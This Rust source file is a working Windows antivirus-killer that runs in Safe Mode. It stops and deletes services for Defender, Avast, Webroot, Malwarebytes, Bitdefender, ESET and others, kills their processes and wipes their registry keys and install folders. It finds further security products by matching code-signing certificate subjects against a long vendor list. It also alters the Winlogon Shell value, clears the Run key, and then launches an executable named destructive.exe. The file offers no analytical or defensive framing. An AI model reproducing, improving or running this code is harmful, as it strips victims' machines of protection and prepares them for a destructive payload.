use std::process::{Command, exit};
use std::io::{self};
use std::path::Path;
use std::collections::HashMap;
use std::env;
use wmi::{WMIConnection, COMLibrary};
use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
use windows::Win32::Foundation::BOOL;
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
use winreg::RegKey;
use std::ffi::c_void;
use std::iter::once;
use std::ptr::null_mut;
use std::fs;
use windows::Win32::Security::Cryptography::{
    CertEnumCertificatesInStore, CertGetNameStringW,
    CertCloseStore, CryptQueryObject, CryptMsgClose,
    CERT_QUERY_OBJECT_FILE,
    CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
    CERT_QUERY_FORMAT_FLAG_BINARY,
    CERT_NAME_SIMPLE_DISPLAY_TYPE,
};

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn execute_command(command: &str) {
    let status = Command::new("cmd")
        .args(&["/C", command])
        .status();

    match status {
        Ok(status) if status.success() => println!("[+] Command succeeded: {}", command),
        Ok(status) => eprintln!("[!] Command failed with status {}: {}", status, command),
        Err(e) => eprintln!("[!] Failed to execute command {}: {}", command, e),
    }
}

fn is_safe_mode() -> bool {
    let mut mode: u32 = 0;
    unsafe {
        if GetOsSafeBootMode(&mut mode as *mut u32) == BOOL(1) {
            // SAFEMODE_MINIMAL (1) or SAFEMODE_NETWORK (2) indicates Safe Mode
            mode == 1 || mode == 2
        } else {
            false
        }
    }
}

fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
    // Create the COM library instance
    let com_lib = COMLibrary::new()?;
    // Pass the COMLibrary instance to WMIConnection::new
    let wmi_con = WMIConnection::new(com_lib)?;

    // Query to get antivirus product information
    let query = "SELECT * FROM AntivirusProduct";
    // Use the ? operator to extract the Vec on success.
    let results: Vec<HashMap<String, String>> = wmi_con.raw_query(query)?;

    // Loop through the results and extract the executable path's folder
    for result in results {
        if let Some(path) = result.get("pathToSignedProductExe") {
            // Extract the folder path
            if let Some(folder_path) = Path::new(path).parent() {
                println!("Executable folder path: {}", folder_path.display());

                // Remove the folder using rd /s /q (silent remove)
                let folder_path_str = folder_path.to_str().ok_or("Invalid path")?;
                let status = Command::new("cmd")
                    .args(&["/C", "rd", "/s", "/q", folder_path_str])
                    .status()?;

                if status.success() {
                    println!("Successfully removed the folder: {}", folder_path.display());
                } else {
                    eprintln!("Failed to remove the folder: {}", folder_path.display());
                }
            }
        }
    }

    Ok(())
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon with write access
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_WRITE,
    )?;

    // Set the new "Shell" value
    let new_shell_value = r"%SystemRoot%\explorer.exe, cmd.exe /c start explorer.exe";
    winlogon_key.set_value("Shell", &new_shell_value)?;

    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);

    Ok(())
}

/// List of antivirus signature substrings to search for in the certificate's subject.
const ANTIVIRUS_LIST: &[&str] = &[
    "System Healer Tech Sp.Zo.o",
    "Beijing Rising Information Technology Corporation Limited",
    "Filseclab Corporation",
    "Trend Micro, Inc.",
    "SUPERAntiSpyware.com",
    "Sophos Ltd",
    "ThreatTrack Security, Inc.",
    "IKARUS Security Software GmbH",
    "Quick Heal Technologies(Pvt) Ltd.",
    "Panda Security S.L",
    "Blue Coat Norway AS",
    "NANO Security Ltd",
    "McAfee, Inc.",
    "Glarysoft LTD",
    "Malwarebytes Corporation",
    "Kaspersky Lab",
    "K7 Computing Pvt Ltd",
    "SurfRight B.V.",
    "FRISK Software International",
    "Fortinet Technologies",
    "Emsisoft GmbH",
    "ESET, spol.s r.o.",
    "Doctor Web Ltd.",
    "Immunet Corporation",
    "Comodo Security Solutions",
    "G DATA Software AG",
    "BullGuard Ltd.",
    "Bitdefender SRL",
    "Avira Operations GmbH & Co.KG",
    "AVG Technologies CZ, s.r.o.",
    "AVAST Software s.r.o.",
    "Check Point Software Technologies Ltd.",
    "VIRUSBLOKADA ODO",
    "Qihoo 360 Software(Beijing) Company Limited",
    "Plumbytes Software Lp",
    "Bleeping Computer, LLC.",
    "Symantec Corporation",
    "AhnLab",
    "Baidu (China)",
    "Safer Networking Ltd.",
    "BrightFort LLC",
    "Gridinsoft, LLC",
    "Auslogics Labs Pty Ltd",
    "Datpol Janusz Siemienowicz",
    "Zemana Ltd.",
    "Piriform Ltd",
    "IObit Information Technology",
];

/// Retrieves the subject string from the first certificate embedded in the file.
/// This function uses CryptQueryObject to load the certificate store from the file
/// and then enumerates the first certificate to retrieve its subject using CertGetNameStringW.
/// Note that no validation is performed.
fn get_signature_subject(file_path: &str) -> Option<String> {
    // Convert the file path to a null-terminated wide string.
    let file_path_w: Vec<u16> = file_path.encode_utf16().chain(once(0)).collect();

    // Declare output variables.
    let mut encoding: u32 = 0;
    let mut content_type: u32 = 0;
    let mut format_type: u32 = 0;
    let mut cert_store = windows::Win32::Security::Cryptography::HCERTSTORE(null_mut());
    let mut msg: isize = 0; // HCRYPTMSG is represented as isize.

    // Call CryptQueryObject.
    // We need to cast the mutable references to the expected pointer types.
    unsafe {
        CryptQueryObject(
            CERT_QUERY_OBJECT_FILE,
            file_path_w.as_ptr() as *const c_void,
            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
            CERT_QUERY_FORMAT_FLAG_BINARY,
            0,
            Some(&mut encoding as *mut u32 as *mut _),
            Some(&mut content_type as *mut u32 as *mut _),
            Some(&mut format_type as *mut u32 as *mut _),
            Some(&mut cert_store),
            Some(&mut msg as *mut isize as *mut *mut c_void),
            None,
        )
        .expect("CryptQueryObject failed");
    }

    // Enumerate the first certificate in the store.
    let p_cert_ctx = unsafe { CertEnumCertificatesInStore(cert_store, None) };
    if !p_cert_ctx.is_null() {
        let mut buf = [0u16; 256];
        // Call CertGetNameStringW with the buffer wrapped as a mutable slice.
        let name_len = unsafe {
            CertGetNameStringW(
                p_cert_ctx,
                CERT_NAME_SIMPLE_DISPLAY_TYPE,
                0,
                None,
                Some(&mut buf[..]),
            )
        };

        // name_len includes the terminating null; if greater than 1, we got a name.
        if name_len > 1 {
            let subject = String::from_utf16_lossy(&buf[..(name_len - 1) as usize]);
            unsafe {
                CertCloseStore(Some(cert_store), 0).ok();
                CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
            }
            return Some(subject);
        }
    }
    // Clean up if no certificate was found.
    unsafe {
        CertCloseStore(Some(cert_store), 0).ok();
        CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
    }
    None
}

/// Removes the entire folder containing the file at `file_path`.
fn remove_folder(file_path: &str) {
    let path = Path::new(file_path);
    if let Some(parent) = path.parent() {
        println!("Deleting folder: {}", parent.display());
        match fs::remove_dir_all(parent) {
            Ok(_) => println!("Successfully removed folder: {}", parent.display()),
            Err(err) => eprintln!("Error removing folder {}: {}", parent.display(), err),
        }
    } else {
        eprintln!("Could not determine parent folder for file: {}", file_path);
    }
}

/// Scans the specified directory (non-recursively) for files.
/// For each file, it retrieves its certificate subject string (without validation)
/// and checks whether that subject contains any antivirus substring.
/// If a match is found, the folder containing that file is removed.
fn scan_directory(dir: &str) {
    println!("Scanning directory: {}", dir);
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            // Process only files.
            if path.is_file() {
                let file_path = path.to_string_lossy().to_string();
                if let Some(subject) = get_signature_subject(&file_path) {
                    let subject_lower = subject.to_lowercase();
                    for av in ANTIVIRUS_LIST {
                        if subject_lower.contains(&av.to_lowercase()) {
                            println!("File {} has certificate subject matching antivirus: {}", file_path, subject);
                            remove_folder(&file_path);
                            break;
                        }
                    }
                }
            }
        }
    } else {
        eprintln!("Could not read directory: {}", dir);
    }
}

fn main() -> io::Result<()> {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        exit(0); // Exit the program with a success status
    }

    // Check for Safe Mode before proceeding
    if is_safe_mode() {
        println!("Safe Mode detected, proceeding with actions...");

        // Declare a mutable vector to hold all the commands.
        let mut commands: Vec<&str> = Vec::new();

        // Group 2: Cleanup Safe Mode setting
        commands.push("bcdedit /deletevalue {current} safeboot");

        // Group 3: Webroot services and files cleanup
        let webroot_cmds = vec![
            // Services to stop
            "sc stop WRSkyClient",
            "sc stop WRCoreService",
            "sc stop WRSVC",
            // Services to delete
            "sc delete WRSkyClient",
            "sc delete WRCoreService",
            "sc delete WRSVC",
            // Files to delete
            "del /f /y \"%SystemRoot%\\System32\\Drivers\\wrkrn.sys\"",
            "del /f /y \"%SystemRoot%\\System32\\wruser.dll\"",
            // Folders to delete
            "rd /s /q \"%ProgramFiles%\\Webroot\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
            "rd /s /q \"%ProgramData%\\WRCore\"",
            "rd /s /q \"%ProgramData%\\WRData\"",
            "rd /s /q \"%ProgramData%\\WRData\"",
            "rd /s /q \"%ProgramFiles%\\Webroot\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
            "rd /s /q \"%ProgramData%\\WRCore\"",
        ];
        commands.extend(webroot_cmds);

        // Group 4: Kaspersky directories cleanup 
        let kaspersky_dirs_cmds = vec![ 
            "rd /s /q \"%ProgramData%\\Kaspersky Lab\"", 
            "rd /s /q \"%ProgramFiles%\\Kaspersky Lab\"", 
            "rd /s /q \"%ProgramFiles(x86)%\\Kaspersky Lab\"", 
        ];

        commands.extend(kaspersky_dirs_cmds);

        // Group 5: Avira directories cleanup
        let avira_dirs_cmds = vec![
            "rd /s /q \"%ProgramFiles%\\Avira\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Avira\"",
            "rd /s /q \"%ProgramData%\\Avira\"",
        ];
        commands.extend(avira_dirs_cmds);

        // Group 6: McAfee directories cleanup
        let mcafee_dirs_cmds = vec![
            "rd /s /q \"%ProgramData%\\McAfee\"",
            "rd /s /q \"%ProgramFiles%\\McAfee\"",
            "rd /s /q \"%ProgramFiles(x86)%\\McAfee\"",
        ];
        commands.extend(mcafee_dirs_cmds);

        // Group 7: Kill antivirus processes
        let kill_processes_cmds = vec![
            "taskkill /F /IM AvastSvc.exe /T",
            "taskkill /F /IM AvastUI.exe /T",
            "taskkill /F /IM AvastWscReporter.exe /T",
            "taskkill /F /IM aswVmm.exe /T",
            "taskkill /F /IM MBAMService.exe /T",
            "taskkill /F /IM MsMpEng.exe /T",
            "taskkill /F /IM VSSERV.exe /T",
        ];
        commands.extend(kill_processes_cmds);

        // Group 8: Stop antivirus services
        let stop_services_cmds = vec![
            // Avast
            "sc stop \"AvastSvc\"",
            "sc stop \"AvastWscReporter\"",
            "sc stop \"aswVmm\"",
            // Malwarebytes
            "sc stop \"MBAMService\"",
            // Windows Defender
            "sc stop \"WinDefend\"",
            "sc stop \"VSSERV\"",
            //  McAfee
            "sc stop \"McAfee Service Controller\"",
            "sc stop \"McAfee Firewall Core Service\"",
            "sc stop \"McAfee Validation Trust Protection\"",
        ];
        commands.extend(stop_services_cmds);

        // Group 9: Delete antivirus services
        let delete_services_cmds = vec![
            // Avast
            "sc delete \"AvastSvc\"",
            "sc delete \"AvastWscReporter\"",
            "sc delete \"aswVmm\"",
            // Malwarebytes
            "sc delete \"MBAMService\"",
            // Windows Defender
            "sc delete \"WinDefend\"",
            "sc delete \"VSSERV\"",
            //  McAfee
            "sc delete \"McAfee Service Controller\"",
            "sc delete \"McAfee Firewall Core Service\"",
            "sc delete \"McAfee Validation Trust Protection\"",
        ];
        commands.extend(delete_services_cmds);

        // Group 10: Delete registry keys for antivirus programs
        let delete_registry_cmds = vec![
            // Startup keys
            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f",
            // Avast-related keys
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbIDSAgent\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbIDSAgent\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswApPct\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswApPct\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsdriver\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsdriver\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsh\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsh\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbuniv\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbuniv\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswElam\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswElam\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswKbd\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswKbd\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswMonFit\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswMonFit\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswNetHub\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswNetHub\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRdr\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRdr\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRvrt\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRvrt\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\avast! Antivirus\" /f",
            // Webroot keys
            "reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Webroot\" /f",
            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WRUNINST\" /f",
            "reg delete \"HKLM\\SOFTWARE\\WRData\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\WRSVC\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\WRSVC\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\WRSVC\" /f",
            // Windows Defender keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\WinDefend\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\WinDefend\" /f",
            // Kaspersky 21.3 keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVP21.3\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\AVP21.3\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\AVP21.3\" /f",
            // Malwarebytes keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MBAMService\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\MBAMService\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\MBAMService\" /f",
            // Bitdefender keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSSERV\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\VSSERV\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\VSSERV\" /f",
            // ESET keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\eamonm\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\edevmon\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ehdrv\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekbdflt\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekrn\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfw\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfwwfp\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ESETCleanersDriver\" /f",
            // Avira key
            "reg delete HKLM\\SOFTWARE\\AVIRA /f",
        ];
        commands.extend(delete_registry_cmds);

        // Execute each command in order
        for command in commands {
            execute_command(command);
        }
        
        // Remove antivirus folder
        if let Err(e) = remove_antivirus_folder() {
            eprintln!("Error removing antivirus folder: {}", e);
        }
        
        // Modify registry for explorer.exe
        if let Err(e) = modify_registry() {
            eprintln!("Error removing antivirus folder: {}", e);
        }

        // Remove antivirus folders from Program Files, Program Files (x86) and Program Data
        println!("Starting scan for antivirus software...");

        // Retrieve system directories from environment variables.
        let mut directories = Vec::new();
        if let Ok(prog_files) = env::var("ProgramFiles") {
            directories.push(prog_files);
        }
        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
            directories.push(prog_files_x86);
        }
        if let Ok(program_data) = env::var("ProgramData") {
            directories.push(program_data);
        }
    
        // Scan each directory.
        for dir in directories {
            scan_directory(&dir);
        }
    
        println!("Scan completed.");

        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }

        println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
    } else {
        println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }
    }

    Ok(())
}
